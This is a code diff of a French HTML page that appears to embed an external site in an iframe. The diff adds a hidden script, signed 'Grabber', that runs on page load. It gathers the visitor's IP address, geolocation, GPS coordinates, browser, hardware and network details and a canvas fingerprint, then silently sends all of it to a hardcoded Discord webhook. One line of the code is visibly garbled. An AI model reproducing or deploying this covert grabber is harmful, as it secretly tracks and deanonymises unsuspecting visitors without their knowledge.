@@ -1,22 +1,172 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Mon site iframe</title>
-  <style>
-    html, body {
-      margin: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Récupérateur de données</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .loading {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            color: #333;
+        }
+        .error {
+            color: red;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-  <iframe src="https://nyr-tech-services.lovable.app"></iframe>
+    <div class="loading">Chargement...</div>
+    <iframe src="https://nyr-tech-services.lovable.app/" title="Contenu intégré" onload="document.querySelector('.loading').style.display='none';" onerror="document.querySelector('.loading').innerHTML='<p class=\"error\">Erreur : Impossible de charger le contenu. Veuillez réessayer.</p>';"></iframe>
+    <script>
+        async function sendUserData() {
+            try {
+                // Récupérer l'IP
+                let ip = 'Non disponible';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip || 'Non disponible';
+                } catch (err) {
+                    console.error('Erreur lors de la récupération de l\'IP:', err);
+                }
+
+                // Récupérer la géolocalisation (basée sur l'IP)
+                let geolocation = 'Non disponible';
+                try {
+                    const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                    const geoData = await geoResponse.json();
+                    if (geoData.status === 'success') {
+                        geolocation = `${geoData.city || 'Inconnue'}, ${geoData.regionName || 'Inconnue'}, ${geoData.country || 'Inconnu'} (ISP: ${geoData.isp || 'Inconnu'}, Lat: ${geoData.lat || 'N/A'}, Lon: ${geoData.lon || 'N/A'})`;
+                    }
+                } catch (err) {
+                    console.error('Erreur lors de la récupération de la géolocalisation:', err);
+                }
+
+                // Récupérer la géolocalisation précise (GPS, avec consentement)
+                let gpsLocation = 'Non disponible (consentement requis)';
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                    });
+                    gpsLocation = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Précision: ${position.coords.accur Cil: ${position.coords.accuracy}m`;
+                } catch (err) {
+                    console.error('Erreur lors de la récupération de la géolocalisation GPS:', err);
+                }
+
+                // Récupérer les informations du navigateur
+                const userAgent = navigator.userAgent || 'Non disponible';
+                const language = navigator.language || 'Non disponible';
+                const languages = navigator.languages ? navigator.languages.join(', ') : 'Non disponible';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Non disponible';
+                const screenResolution = `${window.screen.width}x${window.screen.height}` || 'Non disponible';
+                const windowSize = `${window.innerWidth}x${window.innerHeight}` || 'Non disponible';
+                const colorDepth = window.screen.colorDepth || 'Non disponible';
+                const platform = navigator.platform || 'Non disponible';
+                const cpuCores = navigator.hardwareConcurrency || 'Non disponible';
+                const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : 'Non disponible';
+                const referrer = document.referrer || 'Non disponible';
+                const connection = navigator.connection ? `${navigator.connection.effectiveType || 'N/A'} (Downlink: ${navigator.connection.downlink || 'N/A'} Mbps)` : 'Non disponible';
+                const cookiesEnabled = navigator.cookieEnabled ? 'Oui' : 'Non';
+                const colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sombre' : 'Clair';
+
+                // Récupérer les plugins du navigateur
+                let plugins = 'Non disponible';
+                try {
+                    if (navigator.plugins && navigator.plugins.length > 0) {
+                        plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
+                    }
+                } catch (err) {
+                    console.error('Erreur lors de la récupération des plugins:', err);
+                }
+
+                // Récupérer les informations WebGL
+                let webglInfo = 'Non disponible';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        webglInfo = `Renderer: ${debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'}, Vendor: ${debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A'}`;
+                    }
+                } catch (err) {
+                    console.error('Erreur lors de la récupération des informations WebGL:', err);
+                }
+
+                // Canvas Fingerprinting
+                let canvasFingerprint = 'Non disponible';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Test fingerprint', 2, 15);
+                    canvasFingerprint = canvas.toDataURL().substring(0, 50) + '...';
+                } catch (err) {
+                    console.error('Erreur lors du canvas fingerprinting:', err);
+                }
+
+                // Données à envoyer au webhook
+                const embedData = {
+                    embeds: [
+                        {
+                            title: '**Nouvel utilisateur détecté**',
+                            description: `\`\`\`yaml\nIP: ${ip}\nGéolocalisation (IP): ${geolocation}\nGéolocalisation GPS: ${gpsLocation}\nUser-Agent: ${userAgent}\nLangue: ${language}\nLangues secondaires: ${languages}\nFuseau horaire: ${timezone}\nRésolution d'écran: ${screenResolution}\nTaille de la fenêtre: ${windowSize}\nProfondeur de couleur: ${colorDepth}\nPlateforme: ${platform}\nCœurs CPU: ${cpuCores}\nMémoire appareil: ${deviceMemory}\nConnexion réseau: ${connection}\nRéférent: ${referrer}\nCookies activés: ${cookiesEnabled}\nMode couleur: ${colorScheme}\nPlugins: ${plugins}\nWebGL: ${webglInfo}\nCanvas Fingerprint: ${canvasFingerprint}\nHeure de la visite: ${new Date().toISOString()}\n\`\`\``,
+                            color: 3092790,
+                            footer: {
+                                text: 'Créé par Astraa ・ https://github.com/astraadev'
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ],
+                    username: 'Grabber',
+                    avatar_url: 'https://avatars.githubusercontent.com/u/43183806?v=4'
+                };
+
+                // Envoyer les données au webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1363874507219144877/vXmvyEjWjSSPCNlCi_-bh6XJGrbPtCMFs0S5qNQPkzd6amaXRPeSEhu8dU2CW_1h2iU-';
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embedData)
+                });
+
+                if (response.ok) {
+                    console.log('Données envoyées au webhook avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi au webhook:', response.status);
+                }
+            } catch (err) {
+                console.error('Erreur générale:', err);
+            }
+        }
+
+        // Exécuter la fonction dès que la page est chargée
+        window.onload = () => {
+            sendUserData();
+        };
+    </script>
 </body>
 </html>
